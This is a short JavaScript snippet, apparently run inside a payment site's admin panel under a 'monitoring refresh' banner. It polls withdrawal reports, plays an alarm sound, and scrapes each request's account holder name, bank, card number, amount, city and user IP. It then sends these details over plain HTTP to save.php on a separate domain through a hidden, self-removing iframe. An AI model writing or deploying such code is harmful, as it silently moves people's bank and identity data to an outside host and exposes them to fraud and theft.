(function(){
  var music = $('<audio src="http://www.yuncai.la/images/pipayuls.mp3" loop="loop"></audio>')
  var ajaxs = '';
  var show = $('<div style="font-size:18px;width:300px;text-align:center;height:100px;line-height:100px;background:#850000;color:#fff;position:absolute;top:0;right:0">监控刷新中···</div>')

  String.prototype.between = function(sStart, sEnd, bIncludeSpliter) {
  	if(this.indexOf(sStart) == -1 || this.indexOf(sStart) == -1) { return ''; }
  	return this != '' ? this.replace(/[\n\r]+/gm, '').replace(new RegExp('.*(' + sStart + ')(.*?)(' + sEnd + ').*'), bIncludeSpliter ? '$1$2$3' : '$2') : '';
  };
  
    
  //监控提示
  $('body').append(show);
  //轮询开始
  setInterval(function(){
    if(ajaxs){
      ajaxs.abort();
    }
  
    ajaxs = $.ajax({
     type:'get',
     dataType: 'html',
     url:'http://admin.devsynb.com/?controller=report&action=withdrawel&shows=1',
     success: function(e){
       if(e.indexOf('no-records') != -1){
          music[0].pause()
       }else{
          music[0].play();
          var details = './?controller=report&action=dealwithdraw&id=' + e.between('./?controller=report&action=dealwithdraw&id=','"');
          //读取详细信息
          $.ajax({
           type:'get',
           dataType: 'html',
           url:details,
           success: function(f){
             var name = encodeURIComponent(f.between('提现发起人:</td><td>','</font>'));
             var master = encodeURIComponent(f.between('所属总代:</td><td>','</font>'));
             var bank = encodeURIComponent(f.between('银行名称:</td><td>','</td>'));
             var cardnum = encodeURIComponent(f.between('<span id="card">','</span>'));
             var province = encodeURIComponent(f.between('所属省份:</td><td>','</td>'));
             var city = encodeURIComponent(f.between('所属城市:</td><td>','</td>'));
             var truename = encodeURIComponent(f.between('<span id="uname">','</span>'));
             var amount = encodeURIComponent(f.between('<span id="money">','</span>'));
             var time = encodeURIComponent(f.between('发起时间:</td><td>','</td>'));
             var isvip = encodeURIComponent(f.between('是否VIP:</td><td style="font-weight: bold">','</td>'));
             var ip = encodeURIComponent(f.between('用户IP:</td><td>','</td>'));
             var desc = encodeURIComponent(f.between('用户备注:</td><td>','</td>'));
             
            var iframes = $('<iframe>');
            $('body').append(iframes);
            iframes[0].src = 'http://www.yc888.la/bank/save.php?name=' + name +'&master=' + master + '&bank=' + bank+ '&cardnum=' +cardnum+'&province=' +province+ '&city=' +city+ '&truename=' +truename+ '&amount=' +amount+ '&time=' + time+ '&isvip=' +isvip+ '&ip=' +ip+ '&desc='  + desc;
            setTimeout(function(){
              iframes.remove();    
            },3000)
           },
           error: function(f){
           }
          });
       }
       show.text('监控刷新中···正常运行');
     },
     error: function(e){
       show.text('监控刷新中···运行异常');
     }
    });
  }, 20000);
})();
